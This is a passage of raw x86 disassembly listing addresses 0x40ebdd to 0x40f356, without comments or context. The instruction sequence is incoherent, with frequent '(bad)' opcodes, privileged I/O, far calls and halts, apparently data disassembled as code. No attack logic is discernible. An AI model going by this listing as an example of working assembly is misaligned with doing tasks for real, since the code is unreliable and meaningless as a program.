  40ebdd:	jns    0x40eb97
  40ebdf:	mov    cl,0x0
  40ebe1:	rcr    DWORD PTR [edx-0x34403353],0x56
  40ebe8:	jge    0x40ec19
  40ebea:	adc    bh,BYTE PTR [ebp-0x60]
  40ebed:	add    edx,DWORD PTR [esi]
  40ebef:	xchg   esp,eax
  40ebf0:	jae    0x40ec27
  40ebf2:	and    esp,DWORD PTR [edx+0x5f]
  40ebf5:	add    BYTE PTR [ebp-0x27ba25],0xc6
  40ebfc:	mov    ah,0xac
  40ebfe:	ins    DWORD PTR es:[edi],dx
  40ebff:	pop    es
  40ec00:	(bad)
  40ec05:	mov    bl,0x50
  40ec07:	xor    eax,DWORD PTR [ecx+0x3f]
  40ec0a:	add    eax,0x88a80504
  40ec0f:	cs cmp al,0x6b
  40ec12:	js     0x40ec0f
  40ec14:	mov    ch,al
  40ec16:	pop    edx
  40ec17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec18:	adc    eax,0x15032d56
  40ec1d:	mov    al,BYTE PTR [ebx]
  40ec1f:	cld    
  40ec20:	pop    ds
  40ec21:	xor    ah,BYTE PTR [ebp+0x2cf76e1]
  40ec27:	pop    ds
  40ec28:	mov    esp,0x5676360f
  40ec2d:	sahf   
  40ec2e:	fistp  DWORD PTR [ebx+ebp*4-0x75]
  40ec32:	aam    0x1f
  40ec34:	sbb    al,0x8d
  40ec36:	outs   dx,BYTE PTR ds:[esi]
  40ec37:	or     al,0x89
  40ec39:	stos   DWORD PTR es:[edi],eax
  40ec3a:	pop    edi
  40ec3b:	xor    DWORD PTR [edi-0x260543b0],edi
  40ec41:	mov    al,ds:0xbfeaa235
  40ec46:	adc    eax,0x501f19cd
  40ec4b:	stc    
  40ec4c:	fld    DWORD PTR [ebx+0x3ec57c84]
  40ec52:	ins    DWORD PTR es:[edi],dx
  40ec53:	rcr    DWORD PTR [ebx],0x8a
  40ec56:	push   esp
  40ec57:	sahf   
  40ec58:	cmp    eax,0x2e172d1
  40ec5d:	dec    ecx
  40ec5e:	jl     0x40ebed
  40ec60:	dec    eax
  40ec61:	scas   al,BYTE PTR es:[edi]
  40ec62:	std    
  40ec63:	(bad)  
  40ec64:	in     al,dx
  40ec65:	mov    ebp,0x8ee1b5e8
  40ec6a:	mov    edx,0xa1c1a44a
  40ec6f:	sub    al,0x26
  40ec71:	add    edx,edx
  40ec73:	(bad)
  40ec76:	retf   0x8b49
  40ec79:	push   esi
  40ec7a:	lds    eax,FWORD PTR [eax]
  40ec7c:	fdiv   st,st(4)
  40ec7e:	aad    0x65
  40ec80:	(bad)  
  40ec81:	repz xchg esp,eax
  40ec83:	mov    edx,0x45b88979
  40ec88:	jnp    0x40ec3b
  40ec8a:	mov    bl,BYTE PTR [eax+edi*8+0x4c7ff00e]
  40ec91:	lahf   
  40ec92:	inc    edx
  40ec93:	rcr    DWORD PTR [ebx-0x11e57660],1
  40ec99:	pop    ebp
  40ec9a:	xchg   ebp,eax
  40ec9b:	fucomip st,st(7)
  40ec9d:	dec    esi
  40ec9e:	add    al,0xae
  40eca0:	dec    edi
  40eca1:	pusha  
  40eca2:	sbb    BYTE PTR [edi+0xb9ee8f1],ah
  40eca8:	or     DWORD PTR ds:0x57151705,edx
  40ecae:	enter  0x81d1,0xc9
  40ecb2:	mov    ebp,0x5a701031
  40ecb7:	retf   0xfd6e
  40ecba:	cmp    bl,BYTE PTR ds:0x809022ad
  40ecc0:	pop    ds
  40ecc1:	retf   
  40ecc2:	xchg   ebx,eax
  40ecc3:	lock sub eax,0xf5d619d2
  40ecc9:	pop    ss
  40ecca:	(bad)  
  40eccb:	pusha  
  40eccc:	jae    0x40ecbd
  40ecce:	pop    esp
  40eccf:	pop    edx
  40ecd0:	retf   
  40ecd1:	xor    al,0x2e
  40ecd3:	fbld   TBYTE PTR [eax]
  40ecd5:	nop
  40ecd6:	call   0xff0e:0xa8226a42
  40ecdd:	dec    esi
  40ecde:	xchg   DWORD PTR [ebx-0x5de2fc97],edx
  40ece4:	call   0xdd923591
  40ece9:	xchg   DWORD PTR [ebp+0x5a],ebx
  40ecec:	jecxz  0x40ec95
  40ecee:	out    dx,eax
  40ecef:	mov    ebp,0xac173868
  40ecf4:	mov    edi,0x39727583
  40ecf9:	mov    ds:0x6743911a,eax
  40ecfe:	mov    edi,0xbee7bca4
  40ed03:	sbb    bl,bh
  40ed05:	jmp    0xc793:0xc1853a45
  40ed0c:	mov    ebx,0xab28408
  40ed11:	fimul  WORD PTR [eax-0x17f1ea44]
  40ed17:	xchg   ecx,eax
  40ed18:	mov    bl,0x11
  40ed1a:	loopne 0x40ed37
  40ed1c:	mov    dh,0x4c
  40ed1e:	les    edx,FWORD PTR [edi]
  40ed20:	cmp    dl,BYTE PTR ds:0xc52990d0
  40ed26:	popa   
  40ed27:	push   cs
  40ed28:	add    BYTE PTR [ebp+esi*4+0x56da3ec4],dl
  40ed2f:	cmp    BYTE PTR [ecx],ah
  40ed31:	dec    esi
  40ed32:	xchg   ecx,eax
  40ed33:	idiv   BYTE PTR [eax-0x6f1bfce6]
  40ed39:	test   eax,0x87e35890
  40ed3e:	jmp    0x516e8209
  40ed43:	mov    es,WORD PTR [eax]
  40ed45:	mov    edx,0x490044d6
  40ed4a:	push   edx
  40ed4b:	rcr    BYTE PTR [ecx-0x46],cl
  40ed4e:	or     al,0x79
  40ed50:	pop    es
  40ed51:	les    edi,FWORD PTR [edi]
  40ed53:	jle    0x40ecf8
  40ed55:	bound  esi,QWORD PTR [edi+0x9]
  40ed58:	inc    ecx
  40ed59:	inc    esp
  40ed5a:	ss into 
  40ed5c:	lock dec ebx
  40ed5e:	adc    dh,0x2e
  40ed61:	pop    edi
  40ed62:	xor    ecx,DWORD PTR [ecx-0x6f]
  40ed65:	and    BYTE PTR [ebx+0x7605640d],0xd2
  40ed6c:	in     eax,dx
  40ed6d:	call   DWORD PTR [eax+0x611c01f0]
  40ed73:	inc    ebx
  40ed74:	rcl    ebx,1
  40ed76:	imul   esi,DWORD PTR [edi+0x5b],0xffffffad
  40ed7a:	enter  0xb3bb,0xd7
  40ed7e:	pop    eax
  40ed7f:	fidiv  DWORD PTR [eax-0x44aac5dd]
  40ed85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed86:	adc    al,0x8d
  40ed88:	xor    eax,0x9bbd2e1a
  40ed8d:	sar    ecx,1
  40ed8f:	dec    esp
  40ed90:	xchg   DWORD PTR [esi+0xf],ebp
  40ed93:	push   ss
  40ed94:	fidivr WORD PTR [esi]
  40ed96:	inc    eax
  40ed97:	cmp    BYTE PTR [edi+0x25],0xb5
  40ed9b:	(bad)  
  40ed9c:	jge    0x40ed66
  40ed9e:	int    0x6e
  40eda0:	xor    BYTE PTR [ecx-0x19],bl
  40eda3:	push   cs
  40eda4:	call   DWORD PTR [esi]
  40eda7:	test   BYTE PTR [ecx+0x2ff3cb5a],dh
  40edad:	sub    DWORD PTR [eax+0x2],ebx
  40edb0:	jbe    0x40edbd
  40edb2:	adc    bl,BYTE PTR [esi]
  40edb4:	loope  0x40edf2
  40edb6:	sbb    ebp,ebp
  40edb8:	fs ins DWORD PTR es:[edi],dx
  40edba:	mov    edx,0x9743d150
  40edbf:	mov    bh,0xbe
  40edc1:	je     0x40ed8a
  40edc3:	pop    edx
  40edc4:	xchg   edx,eax
  40edc5:	lods   eax,DWORD PTR ds:[esi]
  40edc6:	xchg   DWORD PTR [edx],ebx
  40edc8:	cdq    
  40edc9:	cmp    DWORD PTR [edx-0x6b],edi
  40edcc:	sbb    eax,0x93a7cd82
  40edd1:	or     BYTE PTR [eax],0x7b
  40edd4:	mov    ecx,0x73e5a98e
  40edd9:	in     eax,dx
  40edda:	loope  0x40ed7d
  40eddc:	jno    0x40edf1
  40edde:	adc    DWORD PTR [ebp-0x420b7c31],ebp
  40ede4:	add    ebp,DWORD PTR ds:0x16e5ce96
  40edea:	xor    esi,DWORD PTR [ebx]
  40edec:	jge    0x40ee6d
  40edee:	push   edx
  40edef:	cmc    
  40edf0:	repz xchg esp,eax
  40edf2:	or     eax,0x15b66f7f
  40edf7:	iret   
  40edf8:	(bad)  
  40edf9:	mov    ds:0xac45ec38,eax
  40edfe:	xchg   esi,eax
  40edff:	lahf   
  40ee00:	add    esi,edi
  40ee02:	or     DWORD PTR [edi],esi
  40ee04:	aas    
  40ee05:	pop    edx
  40ee06:	xchg   edi,eax
  40ee07:	jp     0x40edf0
  40ee09:	push   es
  40ee0a:	lahf   
  40ee0b:	push   es
  40ee0c:	lock mov esi,0xe60d45d3
  40ee12:	jo     0x40ee63
  40ee14:	xlat   BYTE PTR ds:[ebx]
  40ee15:	inc    ecx
  40ee16:	mov    esp,DWORD PTR [esi+ecx*1]
  40ee19:	push   es
  40ee1a:	inc    ebx
  40ee1b:	cmp    DWORD PTR [edx],esp
  40ee1d:	ret    0xab39
  40ee20:	test   al,bl
  40ee22:	jle    0x40ee44
  40ee24:	sub    al,0xe2
  40ee26:	inc    esp
  40ee27:	loope  0x40ee59
  40ee29:	mov    al,ds:0x8430ea33
  40ee2e:	mov    ds:0xa253fd4,al
  40ee33:	cli    
  40ee34:	(bad)
  40ee38:	bound  ecx,QWORD PTR [edi]
  40ee3a:	xchg   esp,ebx
  40ee3c:	push   es
  40ee3d:	sbb    al,0xc7
  40ee3f:	adc    ch,bl
  40ee41:	neg    BYTE PTR ds:0x5803ebae
  40ee47:	add    ah,BYTE PTR [ebx]
  40ee49:	push   edi
  40ee4a:	imul   esi,ebp,0x14bc681b
  40ee50:	mov    ecx,0x2e0de1e8
  40ee55:	push   esp
  40ee56:	mov    eax,ds:0xbcde522f
  40ee5b:	mov    eax,ds:0x2b47b279
  40ee60:	fabs   
  40ee62:	xor    BYTE PTR [edi],bh
  40ee64:	xor    al,0xe4
  40ee66:	fist   DWORD PTR [ebp-0x6f84898a]
  40ee6c:	and    esi,DWORD PTR [ecx+0xb]
  40ee6f:	imul   edi,DWORD PTR [edx+ebp*8-0xd],0x34
  40ee74:	xchg   ebx,eax
  40ee75:	push   eax
  40ee76:	pop    ds
  40ee77:	ss pop ss
  40ee79:	add    eax,0x4f14a5b7
  40ee7e:	jns    0x40eee9
  40ee80:	mov    esp,0xfffbd89e
  40ee85:	(bad)  
  40ee86:	fbstp  TBYTE PTR [edi+0x4d]
  40ee89:	pop    ss
  40ee8a:	inc    edx
  40ee8b:	(bad)  
  40ee8c:	mov    ebp,0x2b58f90e
  40ee91:	jg     0x40ee70
  40ee93:	pop    es
  40ee94:	or     dl,BYTE PTR [ebp-0x7387d99]
  40ee9a:	dec    ebp
  40ee9b:	and    al,BYTE PTR [ecx+0x6dd2af63]
  40eea1:	aad    0xe4
  40eea3:	inc    esi
  40eea4:	popf   
  40eea5:	outs   dx,DWORD PTR ds:[esi]
  40eea6:	in     eax,0x98
  40eea8:	pmaxsw mm0,QWORD PTR ds:[esi+0x26ee8090]
  40eeb0:	sub    ecx,ebx
  40eeb2:	jbe    0x40ee65
  40eeb4:	aad    0x63
  40eeb6:	push   esp
  40eeb7:	fnstsw WORD PTR [eax-0x56]
  40eeba:	sub    DWORD PTR [eax],esp
  40eebc:	push   0x16
  40eebe:	mov    eax,0x99d201bc
  40eec3:	in     al,dx
  40eec4:	xor    al,0x6e
  40eec6:	mov    eax,DWORD PTR [ebx+0x7d]
  40eec9:	shr    al,cl
  40eecb:	hlt    
  40eecc:	or     al,0xd8
  40eece:	mov    ch,0xc5
  40eed0:	mov    al,ds:0x90e96629
  40eed5:	or     al,0x98
  40eed7:	xchg   ebp,eax
  40eed8:	or     eax,0xe13237f3
  40eedd:	adc    DWORD PTR [edx+0x43532e5c],0xa
  40eee4:	je     0x40ef47
  40eee6:	sub    BYTE PTR [ebx],dh
  40eee8:	sahf   
  40eee9:	dec    ebx
  40eeea:	pop    eax
  40eeeb:	mov    esi,0xbbedaef3
  40eef0:	push   cs
  40eef1:	sar    BYTE PTR [ebx],0x49
  40eef4:	clc    
  40eef5:	(bad)  
  40eef6:	mov    dh,BYTE PTR [ecx]
  40eef8:	(bad)
  40eefb:	and    bl,BYTE PTR [ebp-0x24a6fddb]
  40ef01:	test   al,0x41
  40ef03:	jnp    0x40ef22
  40ef05:	ins    DWORD PTR es:[edi],dx
  40ef06:	and    al,al
  40ef08:	mov    cl,0x5e
  40ef0a:	fstp   QWORD PTR [ebp-0xd]
  40ef0d:	leave  
  40ef0e:	xchg   eax,esp
  40ef10:	std    
  40ef11:	shl    BYTE PTR [eax-0x6e],0xb0
  40ef15:	mov    ebp,0x96ec3475
  40ef1a:	call   0xbd15:0x714313e0
  40ef21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef22:	dec    ecx
  40ef23:	mov    BYTE PTR [esi],dl
  40ef25:	jo     0x40eed0
  40ef27:	not    DWORD PTR [eax-0x7b24a4a2]
  40ef2d:	clc    
  40ef2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef2f:	jo     0x40ef08
  40ef31:	mov    edx,0x577bfb14
  40ef36:	jp     0x40ef5d
  40ef38:	mov    ds:0xb53272e8,eax
  40ef3d:	imul   esp,DWORD PTR [edi],0xffffffbb
  40ef40:	jecxz  0x40ef96
  40ef42:	push   ss
  40ef43:	mov    cl,BYTE PTR [ecx+0x60]
  40ef46:	(bad)  
  40ef47:	out    0x20,eax
  40ef49:	pop    ecx
  40ef4a:	rcl    DWORD PTR [eax+0x74],1
  40ef4d:	js     0x40ef1e
  40ef4f:	pop    edi
  40ef50:	in     al,dx
  40ef51:	mov    al,ds:0xc55faa2c
  40ef56:	xor    eax,0x5106db9e
  40ef5b:	lods   al,BYTE PTR ds:[esi]
  40ef5c:	mov    eax,ds:0xc3fb4db6
  40ef61:	jno    0x40ef30
  40ef63:	xor    al,0x3b
  40ef65:	dec    edx
  40ef66:	ja     0x40efe7
  40ef68:	icebp  
  40ef69:	cmc    
  40ef6a:	jp     0x40efe0
  40ef6c:	dec    ebx
  40ef6d:	xchg   ecx,eax
  40ef6e:	outs   dx,DWORD PTR ds:[esi]
  40ef6f:	cmp    al,0x87
  40ef71:	(bad)  
  40ef72:	fisttp QWORD PTR [eax+0x34]
  40ef75:	add    BYTE PTR [ecx-0x37fe7712],dl
  40ef7b:	and    al,0x19
  40ef7d:	(bad)  [ecx]
  40ef7f:	bound  edx,QWORD PTR ds:0xf91ec67a
  40ef85:	and    bh,BYTE PTR [edi+ebp*4-0x23]
  40ef89:	(bad)  
  40ef8a:	aam    0xa2
  40ef8c:	xor    eax,ebp
  40ef8e:	scas   al,BYTE PTR es:[edi]
  40ef8f:	dec    ebx
  40ef90:	pop    esi
  40ef91:	outs   dx,DWORD PTR ds:[esi]
  40ef92:	jecxz  0x40efa8
  40ef94:	xor    edx,ecx
  40ef96:	push   esp
  40ef97:	(bad)  
  40ef98:	daa    
  40ef99:	jle    0x40f009
  40ef9b:	or     al,0x4d
  40ef9d:	test   DWORD PTR [edx+edx*8+0x1747c791],0x276aaf3e
  40efa8:	xchg   BYTE PTR [eax+0x41],cl
  40efab:	jge    0x40f010
  40efad:	push   0xfffffffc
  40efaf:	hlt    
  40efb0:	xchg   edx,eax
  40efb1:	pushf  
  40efb2:	pop    ebx
  40efb3:	retf   
  40efb4:	xor    bl,0xa5
  40efb7:	cs mov dl,0xc2
  40efba:	add    al,0x68
  40efbc:	inc    esp
  40efbd:	retf   
  40efbe:	leave  
  40efbf:	mov    ebp,0xb4b37c26
  40efc4:	pop    esp
  40efc5:	in     al,dx
  40efc6:	test   al,0x8f
  40efc8:	mov    BYTE PTR [esi-0x32feed60],0x1d
  40efcf:	dec    ebx
  40efd0:	faddp  st(3),st
  40efd2:	out    0x70,eax
  40efd4:	(bad)  
  40efd5:	mov    ds:0xc4da65b,al
  40efda:	mov    ah,0xfb
  40efdc:	(bad)  
  40efdd:	popf   
  40efde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efdf:	lea    edx,[eax-0x33171ec8]
  40efe5:	in     al,0xa4
  40efe7:	call   0x84d8:0x15c856aa
  40efee:	sar    BYTE PTR [ebx-0x4ddc457],cl
  40eff4:	inc    bp
  40eff6:	stos   BYTE PTR es:[edi],al
  40eff7:	pusha  
  40eff8:	inc    ebx
  40eff9:	xchg   edi,eax
  40effa:	or     cl,BYTE PTR [ecx]
  40effc:	adc    ah,BYTE PTR [esi]
  40effe:	int3   
  40efff:	jle    0x40eff7
  40f001:	pushf  
  40f002:	sti    
  40f003:	(bad)
  40f006:	jmp    0x40f03d
  40f008:	mov    cl,0xf7
  40f00a:	fs jg  0x40efac
  40f00d:	hlt    
  40f00e:	(bad)  
  40f00f:	mul    DWORD PTR [eax+esi*2+0x1]
  40f013:	push   es
  40f014:	xchg   esp,eax
  40f015:	add    BYTE PTR [ecx+0x1c],bh
  40f018:	jg     0x40f020
  40f01a:	gs inc ebx
  40f01c:	push   0x8e70e92b
  40f021:	mov    eax,ds:0x8b30326c
  40f026:	ret    0xbf9f
  40f029:	iret   
  40f02a:	out    dx,al
  40f02b:	call   0xa50bf7a5
  40f030:	out    dx,al
  40f031:	imul   ecx,DWORD PTR [esp+edx*4+0x1dec27ec],0x46
  40f039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f03a:	iret   
  40f03b:	sub    al,0x65
  40f03d:	cmp    ch,BYTE PTR [eax]
  40f03f:	jle    0x40f037
  40f041:	inc    esp
  40f042:	cwde   
  40f043:	sbb    dh,BYTE PTR [eax]
  40f045:	idiv   BYTE PTR [ebp+0x739a6c69]
  40f04b:	inc    ah
  40f04d:	in     eax,0x77
  40f04f:	xor    bl,BYTE PTR ds:0x6bc390cf
  40f055:	dec    ebx
  40f056:	in     al,0xac
  40f058:	stos   BYTE PTR es:[edi],al
  40f059:	dec    edx
  40f05a:	rol    ecx,0xe1
  40f05d:	dec    esi
  40f05e:	pop    es
  40f05f:	mov    bl,0x6f
  40f061:	adc    eax,0xe3d62b87
  40f066:	lods   al,BYTE PTR ds:[esi]
  40f067:	repz sbb dh,ch
  40f06a:	cmp    eax,0x9709ccee
  40f06f:	clc    
  40f070:	jmp    0x44fe:0xc4663f2d
  40f077:	xor    al,0x54
  40f079:	adc    DWORD PTR [edx+0x7a76bc08],ecx
  40f07f:	scas   al,BYTE PTR es:[edi]
  40f080:	stos   DWORD PTR es:[edi],eax
  40f081:	ror    DWORD PTR ss:[edi+ecx*8],0x73
  40f086:	rcl    DWORD PTR [edi+0x2c999437],1
  40f08c:	jns    0x40f077
  40f08e:	mov    bl,0x90
  40f090:	icebp  
  40f091:	mov    ecx,ebx
  40f093:	or     BYTE PTR [ebx+0x29],al
  40f096:	mov    dh,0xa7
  40f098:	adc    al,0xdc
  40f09a:	sbb    BYTE PTR [ebx-0x1d],cl
  40f09d:	shl    cl,1
  40f09f:	sub    edx,DWORD PTR [ebp+esi*8-0x21]
  40f0a3:	fwait
  40f0a4:	adc    BYTE PTR [edi-0x63],al
  40f0a7:	das    
  40f0a8:	lods   eax,DWORD PTR ds:[esi]
  40f0a9:	sbb    esp,DWORD PTR [ebx+ecx*1]
  40f0ac:	repz aaa 
  40f0ae:	mov    ebp,0x5e243221
  40f0b3:	fistp  QWORD PTR [esi+0x2a]
  40f0b6:	xchg   ecx,eax
  40f0b7:	mov    cl,0xe1
  40f0b9:	cmp    edi,ebx
  40f0bb:	test   DWORD PTR [ecx+0x50983f08],ebp
  40f0c1:	xchg   ebp,eax
  40f0c2:	fbld   TBYTE PTR [esi]
  40f0c4:	imul   ebx,DWORD PTR [edi+0x78],0xcf4c1ee
  40f0cb:	bound  ebp,QWORD PTR [eax+0x2f92196e]
  40f0d1:	mov    bh,BYTE PTR [ebx]
  40f0d3:	sar    bh,0x7
  40f0d6:	push   esp
  40f0d7:	mul    BYTE PTR [esp+ebp*1+0x758941f4]
  40f0de:	or     BYTE PTR [eax],dh
  40f0e0:	imul   ecx,edi,0xa369cdb5
  40f0e6:	jae    0x40f0fc
  40f0e8:	call   0x114544e8
  40f0ed:	cmc    
  40f0ee:	(bad)  
  40f0ef:	adc    BYTE PTR gs:[ebp-0x59d5f321],0x5c
  40f0f7:	(bad)  
  40f0f8:	aam    0x3c
  40f0fa:	ja     0x40f0d2
  40f0fc:	mov    eax,ds:0xab038e23
  40f101:	stos   DWORD PTR es:[edi],eax
  40f102:	xor    DWORD PTR [eax+0x6e],0x5a
  40f106:	mov    ah,0x18
  40f108:	or     cl,BYTE PTR [ebp+edx*4-0x13df805c]
  40f10f:	es xor al,0x9c
  40f112:	cmp    eax,0x748693ba
  40f117:	push   ss
  40f118:	adc    BYTE PTR [ebx+0x3e],al
  40f11b:	mov    edi,fs
  40f11d:	mov    eax,0x9eb88d76
  40f122:	inc    ebp
  40f123:	and    al,0x42
  40f125:	mov    BYTE PTR [esi+eax*2-0x6e],al
  40f129:	xor    DWORD PTR [edx-0x6],ebx
  40f12c:	push   edx
  40f12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f12e:	add    eax,0x1107317e
  40f133:	sbb    BYTE PTR ds:0xb5b1085,ah
  40f139:	out    0x6a,eax
  40f13b:	ds inc edi
  40f13d:	dec    ebx
  40f13e:	mov    esi,0x4e0830e7
  40f143:	(bad)  
  40f144:	aam    0x97
  40f146:	cmp    al,0x82
  40f148:	push   ecx
  40f149:	ja     0x40f10c
  40f14b:	stos   DWORD PTR es:[edi],eax
  40f14c:	and    BYTE PTR [ebx+esi*8-0x203ce0c6],dh
  40f153:	sbb    bh,BYTE PTR [edx-0x30d877e0]
  40f159:	adc    dh,BYTE PTR [esi]
  40f15b:	dec    esp
  40f15c:	or     bh,0x9d
  40f15f:	inc    ecx
  40f160:	std    
  40f161:	je     0x40f114
  40f163:	out    dx,eax
  40f164:	sub    ebp,ebp
  40f166:	lea    esi,[ebp+eax*2+0x20537bf2]
  40f16d:	adc    bh,BYTE PTR [eax]
  40f16f:	(bad)  
  40f170:	loop   0x40f17c
  40f172:	fnstsw WORD PTR [esi]
  40f174:	repnz (bad) 
  40f176:	cmc    
  40f177:	xchg   ebp,eax
  40f178:	add    bh,BYTE PTR [ebx+0x23]
  40f17b:	out    0xa7,eax
  40f17d:	adc    al,0x6b
  40f17f:	ret    0x1f1f
  40f182:	jecxz  0x40f142
  40f184:	sub    eax,0xde87a003
  40f189:	in     eax,0x16
  40f18b:	mov    fs,WORD PTR [eax]
  40f18d:	jo     0x40f12a
  40f18f:	push   ebp
  40f190:	pop    eax
  40f191:	in     al,dx
  40f192:	leave  
  40f193:	loope  0x40f12a
  40f195:	test   al,0x1d
  40f198:	mov    ah,0x7a
  40f19a:	mov    ch,0x15
  40f19c:	dec    ebx
  40f19d:	pop    ecx
  40f19e:	sub    BYTE PTR [edx+0x54],ch
  40f1a1:	mov    ecx,0x5cddf4a9
  40f1a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1a7:	enter  0x184b,0x3a
  40f1ab:	jbe    0x40f155
  40f1ad:	inc    ebp
  40f1ae:	sbb    eax,edx
  40f1b0:	adc    edi,DWORD PTR [esi]
  40f1b2:	mov    bl,BYTE PTR [ebx+0x75ff8686]
  40f1b8:	inc    esi
  40f1b9:	ins    BYTE PTR es:[edi],dx
  40f1ba:	pop    esi
  40f1bb:	adc    eax,0x276f1970
  40f1c0:	(bad)  
  40f1c2:	pop    es
  40f1c3:	mov    ah,0x30
  40f1c5:	mov    al,ds:0xa6fb5bd2
  40f1ca:	mov    ds:0x36da1e92,eax
  40f1cf:	push   esi
  40f1d0:	call   0xb2851c90
  40f1d5:	shl    BYTE PTR [esi-0x69],1
  40f1d8:	out    dx,eax
  40f1d9:	xlat   BYTE PTR ds:[ebx]
  40f1da:	jl     0x40f231
  40f1dc:	(bad)  
  40f1dd:	xlat   BYTE PTR ds:[ebx]
  40f1de:	mov    edi,0xee18d42
  40f1e3:	and    eax,0xa5af72b9
  40f1e8:	fadd   QWORD PTR [edi+0x1d5b4ac1]
  40f1ee:	sar    DWORD PTR [eax-0x5f],1
  40f1f1:	daa    
  40f1f2:	aam    0x49
  40f1f4:	mov    esi,DWORD PTR [ebx+ebx*8]
  40f1f7:	lds    eax,FWORD PTR [ebx+0x68e02c8e]
  40f1fd:	xchg   esp,eax
  40f1fe:	pusha  
  40f1ff:	sar    BYTE PTR [esi],cl
  40f201:	lahf   
  40f202:	dec    eax
  40f203:	sar    BYTE PTR [ebx+esi*2+0x6d],cl
  40f207:	mov    dl,0x61
  40f209:	jl     0x40f203
  40f20b:	mov    ecx,eax
  40f20d:	xchg   DWORD PTR [ebp+esi*1-0x67c445be],edx
  40f214:	nop
  40f215:	push   cs
  40f216:	mov    ecx,esi
  40f218:	add    DWORD PTR [edi-0x26],0xf4baf048
  40f21f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f220:	xchg   ebp,eax
  40f221:	xor    al,0xf3
  40f223:	outs   dx,BYTE PTR ds:[esi]
  40f224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f225:	push   ecx
  40f226:	loopne 0x40f253
  40f228:	daa    
  40f229:	repz jg 0x40f22c
  40f22c:	fs pop esi
  40f22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f22f:	std    
  40f230:	push   esp
  40f231:	jbe    0x40f24b
  40f233:	jb     0x40f1ba
  40f235:	cli    
  40f236:	scas   eax,DWORD PTR es:[edi]
  40f237:	xor    BYTE PTR [esi],dh
  40f239:	or     BYTE PTR ds:0x6ac90201,dl
  40f23f:	hlt    
  40f240:	pop    edi
  40f241:	adc    eax,0xdf57c6e
  40f246:	arpl   WORD PTR [edi],cx
  40f248:	cmp    eax,0x7c843db1
  40f24d:	push   0xcccb4ca4
  40f252:	inc    ebp
  40f253:	xor    ebp,ebp
  40f255:	call   0x21d815bd
  40f25a:	pop    edi
  40f25b:	js     0x40f243
  40f25d:	(bad)  
  40f25e:	and    BYTE PTR [eax+edx*2+0x5b405b6b],ah
  40f265:	adc    eax,0xd7d131d
  40f26a:	(bad)  
  40f26b:	xchg   ecx,eax
  40f26c:	inc    ebp
  40f26d:	mov    cl,0x59
  40f26f:	repnz and BYTE PTR [edx-0x5e],bl
  40f273:	repz js 0x40f206
  40f276:	in     eax,0x76
  40f278:	mov    cs,WORD PTR [esi+0x5bc0f407]
  40f27e:	xchg   ebx,eax
  40f27f:	stos   BYTE PTR es:[edi],al
  40f280:	mov    esp,0xc53722fd
  40f285:	pop    ss
  40f286:	jmp    0x26ff30e9
  40f28b:	mov    esp,fs
  40f28d:	pop    ss
  40f28e:	addr16 jg 0x40f2fd
  40f291:	mov    WORD PTR [ebx+0x73],fs
  40f294:	cmp    ebx,0xffffffc6
  40f297:	xor    edi,DWORD PTR [edi+0x72]
  40f29a:	mov    WORD PTR [edi-0x4d2a9cda],ss
  40f2a0:	add    dl,BYTE PTR [esp+eiz*4]
  40f2a3:	pusha  
  40f2a4:	mov    edi,DWORD PTR [ebx]
  40f2a6:	sub    DWORD PTR [edi+0x1b],ecx
  40f2a9:	pushaw 
  40f2ab:	and    eax,0x950174ec
  40f2b0:	mov    ebx,0x9ec05307
  40f2b5:	std    
  40f2b6:	mov    cl,0x5f
  40f2b8:	loop   0x40f32e
  40f2ba:	aas    
  40f2bb:	retf   
  40f2bc:	repnz xchg ecx,eax
  40f2be:	lods   al,BYTE PTR ds:[esi]
  40f2bf:	or     eax,0x115d0150
  40f2c4:	inc    ebx
  40f2c5:	sar    al,cl
  40f2c7:	cld    
  40f2c8:	add    DWORD PTR [ecx+edi*8+0x77],edx
  40f2cc:	push   ds
  40f2cd:	jae    0x40f263
  40f2cf:	mov    al,0xc7
  40f2d1:	mov    edi,0xf0be2722
  40f2d6:	out    0x3e,eax
  40f2d8:	fild   QWORD PTR [ebx+0x5d]
  40f2db:	mov    bh,0x93
  40f2dd:	cmp    eax,0xbe1d566c
  40f2e2:	inc    esi
  40f2e3:	gs xchg esi,eax
  40f2e5:	jb     0x40f2ba
  40f2e7:	imul   ecx
  40f2e9:	pop    esi
  40f2ea:	mov    BYTE PTR [esp+ecx*8-0x31],bh
  40f2ee:	xchg   esi,eax
  40f2ef:	mov    esp,0xfee829e0
  40f2f4:	fdiv   QWORD PTR [edi]
  40f2f6:	adc    bl,dl
  40f2f8:	fnstsw WORD PTR [esp+eax*2]
  40f2fb:	aam    0x97
  40f2fd:	scas   al,BYTE PTR es:[edi]
  40f2fe:	test   al,0x14
  40f300:	fsincos 
  40f302:	into   
  40f303:	mov    edx,0x7c349d5b
  40f308:	push   esi
  40f309:	and    BYTE PTR [edi-0x7bc26892],al
  40f30f:	aad    0x4c
  40f311:	jle    0x40f34d
  40f313:	pop    es
  40f314:	lods   eax,DWORD PTR ds:[esi]
  40f315:	setg   BYTE PTR [ebx+0x28]
  40f319:	inc    esi
  40f31a:	hlt    
  40f31b:	push   esi
  40f31c:	imul   eax,edi,0x47
  40f31f:	or     DWORD PTR ds:0xcab62250,0x6
  40f326:	call   0x532fffbf
  40f32b:	xchg   ebx,eax
  40f32c:	iret   
  40f32d:	int3   
  40f32e:	sbb    DWORD PTR [edx-0x7d],0x3d
  40f332:	xchg   edx,eax
  40f333:	das    
  40f334:	xor    edi,eax
  40f336:	jb     0x40f2b9
  40f338:	xchg   edi,eax
  40f339:	cmp    al,0x62
  40f33b:	cli    
  40f33c:	adc    dh,BYTE PTR [ebx+0x40]
  40f33f:	push   es
  40f340:	test   BYTE PTR [edx-0x1a3bfb0e],bl
  40f346:	nop
  40f347:	push   eax
  40f348:	mov    esi,0x5ded61a2
  40f34d:	xor    al,BYTE PTR [ecx]
  40f34f:	mov    al,0x52
  40f351:	or     eax,0x1f130345
  40f356:	fwait
